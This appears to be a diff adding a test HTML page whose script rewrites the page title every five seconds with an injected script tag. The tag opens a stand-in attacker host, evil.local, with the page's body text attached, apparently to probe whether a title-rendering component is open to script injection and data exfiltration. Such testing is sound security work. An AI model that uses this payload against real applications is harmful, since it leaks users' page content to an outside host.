@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>HTML Reference</title>
+    <script>
+        setInterval(function() {
+            document.title = '<script>window.open("http://evil.local:3001?content=" +document.body.innerText)<\/script>'  + new Date();
+        }, 5 * 1000); // 60 * 1000 milsec
+    </script>
+</head>
+
+<body>
+The content of the document......
+</body>
+
+</html>
